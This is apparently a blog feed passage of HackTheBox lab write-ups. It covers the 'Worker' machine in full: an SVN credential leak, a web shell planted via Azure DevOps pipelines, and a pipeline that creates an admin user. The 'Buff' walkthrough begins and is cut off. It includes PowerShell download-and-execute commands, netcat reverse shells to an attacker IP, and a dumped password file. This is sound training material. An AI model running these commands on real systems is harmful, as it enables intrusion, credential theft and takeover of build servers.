</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>svn cli client - Preinstalled in Kali Linux</li>
<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19» 
$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
<span class="c1"># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
Nmap scan report <span class="k">for</span> dimension.worker.htb <span class="o">(</span>10.10.10.203<span class="o">)</span>
Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Service Unavailable
3690/tcp open  svnserve Subversion
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
$ nmap -p53,445,389,5985 10.10.10.203
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-31 13:34 EST
Host is up <span class="o">(</span>0.013s latency<span class="o">)</span>.

PORT     STATE     SERVICE
<span class="m">53</span>       filtered  domain
<span class="m">389</span>      filtered  ldap
<span class="m">445</span>      filtered  microsoft-ds
<span class="m">5985</span>     open      wsman
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the port 80 displays the IIS default page.</p>
<p><img class="img-container" src="imgs/image-20210503174900610.png" alt="image-20210503174900610"  />
</p>
<h3 id="tcp-3690---subversionsvn">TCP 3690 - Subversion/SVN</h3>
<p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p>
<p>The general usage as follows:</p>
<pre><code>svn &lt;sub-command&gt; svn://[ip]
</code></pre><ul>
<li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li>
</ul>
<p>With the subcommand <code>ls</code>, I can list the repository contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div><p><code>moved.txt</code> tells that the repository is no longer maintained. The latest repo is available at <code>http://devops.worker.htb</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn cat svn://10.10.10.203/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span class="o">)</span>
</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn info svn://10.10.10.203
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: <span class="m">5</span>
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: <span class="m">5</span>
Last Changed Date: 2020-06-20 09:52:00 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span>
</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn log svn://10.10.10.203
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r5 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:52:00 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
Added note that repo has been migrated
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r4 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:50:20 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
Moving this repo to our new devops server which will handle the deployment <span class="k">for</span> us
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r3 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:46:19 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
-
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r2 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:45:16 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
Added deployment script
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r1 <span class="p">|</span> nathen <span class="p">|</span> 2020–06–20 09:43:43 -0400 <span class="o">(</span>Sat, <span class="m">20</span> Jun 2020<span class="o">)</span> <span class="p">|</span> <span class="m">1</span> line
First version
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p>
<p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn diff -r 1:2 svn://10.10.10.203/
</code></pre></div><p><img class="img-container" src="imgs/image-20210503175056134.png" alt="image-20210503175056134"  />
</p>
<p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p>
<ul>
<li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li>
<li>A set of credentials: <code>nathen:wendel98</code></li>
</ul>
<p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">10.10.10.203 dimension.worker.htb devops.worker.htb
</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p>
<h3 id="tcp-80---dimensionworkerhtb">TCP 80 - dimension.worker.htb</h3>
<p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p>
<p><img class="img-container" src="imgs/image-20210503175111010.png" alt="image-20210503175111010"  />
</p>
<p>It even leads to others static site (with subdomain) which I think they are just decoy.</p>
<p><img class="img-container" src="imgs/image-20210503175127918.png" alt="image-20210503175127918"  />
</p>
<p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p>
<ul>
<li><code>alpha.worker.htb</code></li>
<li><code>cartoon.worker.htb</code></li>
<li><code>lens.worker.htb</code></li>
<li><code>solid-state.worker.htb</code></li>
<li><code>spectral.worker.htb</code></li>
<li><code>story.worker.htb</code></li>
</ul>
<p>Now I&rsquo;ll jump over to the mentioned new DevOps server at <code>http://devops.worker.htb</code>.</p>
<h3 id="azure-devops---smarthotel360">Azure DevOps - SmartHotel360</h3>
<p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210503175154637.png" alt="image-20210503175154637"  />
</p>
<p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p>
<p><img class="img-container" src="imgs/image-20210503175211414.png" alt="image-20210503175211414"  />
</p>
<p>User permission or group related settings are found to be under the Security menu (Project Settings -&gt; Security Settings).</p>
<p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p>
<p><img class="img-container" src="imgs/image-20210503175233456.png" alt="image-20210503175233456"  />
</p>
<p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p>
<p><img class="img-container" src="imgs/image-20210503175249455.png" alt="image-20210503175249455"  />
</p>
<p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p>
<p><img class="img-container" src="imgs/image-20210503230648404.png" alt="image-20210503230648404"  />
</p>
<p>From there, I try to lookup into the project&rsquo;s repository.</p>
<p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p>
<p><img class="img-container" src="imgs/image-20210503175346216.png" alt="image-20210503175346216"  />
</p>
<p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p>
<blockquote>
<p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p>
</blockquote>
<p><img class="img-container" src="imgs/image-20210503175356998.png" alt="image-20210503175356998"  />
</p>
<p>User <code>nathen</code> is allowed to queue a builds.</p>
<p><img class="img-container" src="imgs/image-20210503175409857.png" alt="image-20210503175409857"  />
</p>
<p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-iis-appool">Shell as IIS appool</h3>
<h4 id="webshell-upload">Webshell Upload</h4>
<p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p>
<p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p>
<p><img class="img-container" src="imgs/image-20210503175435088.png" alt="image-20210503175435088"  />
</p>
<p>I&rsquo;ll pick any available work items.</p>
<p><img class="img-container" src="imgs/image-20210503175452577.png" alt="image-20210503175452577"  />
</p>
<p>I can just drag and drop the web shell, and commit it afterwards.</p>
<p><img class="img-container" src="imgs/image-20210503175506892.png" alt="image-20210503175506892"  />
</p>
<p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p>
<p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p>
<p><img class="img-container" src="imgs/image-20210503175518917.png" alt="image-20210503175518917"  />
</p>
<p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p>
<p><img class="img-container" src="imgs/image-20210503175531792.png" alt="image-20210503175531792"  />
</p>
<p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p>
<p><img class="img-container" src="imgs/image-20210503175541314.png" alt="image-20210503175541314"  />
</p>
<p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">powershell.exe <span class="s2">&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
</code></pre></div><p>I have a shell now on my listener.</p>
<p><img class="img-container" src="imgs/image-20210503175604917.png" alt="image-20210503175604917"  />
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-robisl">Shell as robisl</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">BookHackTrick</a>, it can be abused using RogueWinRM.</p>
<p><img class="img-container" src="imgs/image-20210503175615273.png" alt="image-20210503175615273"  />
</p>
<p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p>
<p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p>
<p><img class="img-container" src="imgs/image-20210503175630874.png" alt="image-20210503175630874"  />
</p>
<p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">PS C:\Users&gt; net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment                      
User’s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2020-08-18 18:28:36

Logon hours allowed          All

Local Group Memberships      *Production           *Remote 
Global Group memberships     *None                 
The command completed successfully.
</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p>
<pre><code>PS C:\users\&gt;net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
W$           W:\                             Default share
ADMIN$       C:\Windows                      Remote Admin
The command completed successfully.
</code></pre><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p>
<pre><code>PS W:\&gt; dir


    Directory: W:\


Mode                LastWriteTime         Length Name                                                             
----                -------------         ------ ----                                                             
d-----       2020-06-16     18:59                agents                                                          
d-----       2020-03-28     15:57                AzureDevOpsData                                                
d-----       2020-04-03     11:31                sites                                                          
d-----       2020-06-20     16:04                svnrepos
</code></pre><p>I can enumerate all folder and sub folder on the <code>W:\</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to use <code>cmd /c &lt;command&gt;</code> keyword.</p>
<pre><code>PS W:\&gt; cmd.exe /c &quot;dir /s /b svnrepos&quot;
</code></pre><p>Well PowerShell can do that too, but I prefer <code>cmd</code>.</p>
<pre><code>PS W:\&gt; Get-ChildItem -Path W:\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
</code></pre><p>In the output, there is a <code>passwd</code> file that immediately draws my attention</p>
<p><img class="img-container" src="imgs/image-20210504232344047.png" alt="image-20210504232344047"  />
</p>
<p>The <code>passwd</code> file contains a bunch of credentials, and my eyes caught the password for <code>robisl</code>.</p>
<pre><code>PS W:\svnrepos\&gt; gc .\www\conf\passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
</code></pre><h4 id="remote-access---robisl">Remote Access - robisl</h4>
<p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; whoami
worker<span class="se">\r</span>obisl
*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; dir


    Directory: C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/29/2020   3:37 PM             <span class="m">34</span> user.txt
</code></pre></div><h3 id="shell-as-administrator">Shell as administrator</h3>
<h4 id="azure-devops---partsunlimited">Azure DevOps - PartsUnlimited</h4>
<p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p>
<p><img class="img-container" src="imgs/image-20210503175744995.png" alt="image-20210503175744995"  />
</p>
<p>Long short story, <code>robisl </code> is member of Build Administrator.</p>
<p><img class="img-container" src="imgs/image-20210503175756504.png" alt="image-20210503175756504"  />
</p>
<p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">source</a>].</p>
<p><img class="img-container" src="imgs/image-20210504010111041.png" alt=""  />
</p>
<h4 id="exploit-azure-pipelines---read-the-root-flag">Exploit Azure Pipelines - Read the Root Flag</h4>
<p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p>
<p><img class="img-container" src="imgs/image-20210503175809136.png" alt="image-20210503175809136"  />
</p>
<p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p>
<p><img class="img-container" src="imgs/image-20210503175820811.png" alt="image-20210503175820811"  />
</p>
<p>So, let’s execute the plan!</p>
<p>First, I’ll create a pipeline (Pipelines -&gt; Builds -&gt;  New Pipeline).</p>
<p><img class="img-container" src="imgs/image-20210503175837201.png" alt="image-20210503175837201"  />
</p>
<p>In the next section, I’ll choose Azure Repos Git.</p>
<p><img class="img-container" src="imgs/image-20210503175848517.png" alt="image-20210503175848517"  />
</p>
<p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p>
<p><img class="img-container" src="imgs/image-20210503175906165.png" alt="image-20210503175906165"  />
</p>
<p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p>
<p><img class="img-container" src="imgs/image-20210503175920007.png" alt="image-20210503175920007"  />
</p>
<p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p>
<p>I’ll save it and run it on a new branch.</p>
<p><img class="img-container" src="imgs/image-20210503175931307.png" alt="image-20210503175931307"  />
</p>
<p>I’ll just wait for the output log.</p>
<p><img class="img-container" src="imgs/image-20210503175944023.png" alt="image-20210503175944023"  />
</p>
<p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p>
<p><img class="img-container" src="imgs/image-20210503175957351.png" alt="image-20210503175957351"  />
</p>
<h4 id="create-user-with-administrator-privileges">Create User with Administrator Privileges</h4>
<p>I can also create a privileged user using multi-line script.</p>
<pre><code>- script: | 
net user iamf YourComplexPassword /add /domain
net localgroup Administrators iamf /add 
net localgroup &quot;Remote Management Users&quot; iamf /add 
displayName: &quot;Set IamF to Admin&quot;
</code></pre><p>I can push it again and wait for it to complete.</p>
<p><img class="img-container" src="imgs/image-20210503180039057.png" alt="image-20210503180039057"  />
</p>
<p>Now I can login with the newly created user.</p>
<p><img class="img-container" src="imgs/image-20210503180028754.png" alt="image-20210503180028754"  />
</p>
<hr>
<p>References:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
<li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Buff</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-buff/</link>
      <pubDate>Sat, 01 May 2021 16:30:16 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-buff/</guid>
      <description>Buff is a Windows machine with easy difficulty from HackTheBox that features an open source web application called &amp;ldquo;Gym Management System&amp;rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator.</description>
      <content:encoded><![CDATA[<p>Buff is a Windows machine with easy difficulty  from HackTheBox that features an open source web application called &ldquo;Gym Management System&rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Gym Management System 1.0 Exploitation</li>
<li>Port Forwarding</li>
<li>CloudMe 1.12 Exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>searchsploit/Exploit-DB - Preinstalled in Kali Linux</li>
<li>chisel - <a href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a></li>
<li>msfvenom - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> only discovers one port open on 8080 running an Apache web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.18»
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6<span class="o">)</span>
<span class="p">|</span> http-methods:
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
<span class="p">|</span>_http-server-header: Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6
<span class="p">|</span>_http-title: mrb3n’s Bro Hut
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>Visiting port 8080 displays a website for a Gym, on the title it is called &ldquo;mrb3n&rsquo;s Bro Hut&rdquo;.</p>
<p><img src="imgs/image-20210502140814680.png" alt="image-20210502140814680" style="zoom: 67%;" /></p>
<p>Clicking on the contact page discovers the name of the software behind this web application.</p>
<p><img src="imgs/image-20210502140846741.png" alt="image-20210502140846741" style="zoom:67%;" /></p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I can feed the software name to <code>searchsploit</code>. It shows several exploits, and one that stands out is the remote code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «machines» «10.10.14.18»
$ searchsploit Gym Management System 1.0
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 <span class="p">|</span>  Path
------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - <span class="s1">&#39;id&#39;</span> SQL Injection                                 <span class="p">|</span> php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                              <span class="p">|</span> php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                        <span class="p">|</span> php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution              <span class="p">|</span> php/webapps/48506.py
------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-shaun">Shell as shaun</h3>
<p><code>searchsploit -m</code> allows me to mirror/make a copy of the &ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution&rdquo; exploit to the current working directory</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «exploit» «10.10.14.18»
$ searchsploit -m <span class="m">48506</span>
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/htb/machines/buff/exploit/48506.py


→ root@kali «exploit» «10.10.14.18»
$ ls -l
total <span class="m">8</span>
-rwxr-xr-x <span class="m">1</span> root root <span class="m">5164</span> May  <span class="m">2</span> 04:29 48506.py
</code></pre></div><p>I’ll rename <code>48506.py</code> to <code>exploit.py</code>, and run it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «exploit» «10.10.14.18»
$ python exploit.py http://10.10.10.198:8080/
</code></pre></div><p><img src="imgs/image-20210502153153898.png" alt="image-20210502153153898" style="zoom:67%;" /></p>
<p>With current pseudo shell access, I can&rsquo;t change my directory but I can still grab the user flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt; type \users\shaun\desktop\user.txt
</code></pre></div><h4 id="upgrade-to-interactive-shell">Upgrade to Interactive Shell</h4>
<p>To make the shell a bit more comfy, I uploaded a <code>netcat</code> using <code>powershell</code> to Buff, and then I&rsquo;ll create another reverse shell session.</p>
<p>First, I&rsquo;ll host the 64 bit netcat, <code>nc64.exe</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ python -m http.server <span class="m">80</span>
Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.198 - - <span class="o">[</span>14/Aug/2020 10:11:02<span class="o">]</span> <span class="s2">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span class="m">200</span>
</code></pre></div><p>On Buff, I&rsquo;ll grab the hosted <code>nc64.exe</code> using PowerShell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">C:</span><span class="p">\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="p">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe&#34;</span>
</code></pre></div><p>Now I&rsquo;ll setup a listener on my Kali, and send a reverse shell from Buff using the downloaded <code>nc.exe</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt;.\nc.exe -e cmd.exe 10.10.14.18 9001
</code></pre></div><p>I have a &ldquo;proper&rdquo; shell now</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ nc -nvlp <span class="m">9001</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
connect to <span class="o">[</span>10.10.14.18<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.198<span class="o">]</span> <span class="m">64518</span>
Microsoft Windows <span class="o">[</span>Version 10.0.17134.1550<span class="o">]</span>  
<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.   

C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>After enumerating the Users folder, I noticed a slightly different output when typing the <code>dir</code> command in <code>shaun</code> home directory.</p>
<p><img class="img-container" src="imgs/image-20210502155544622.png" alt="image-20210502155544622"  />
</p>
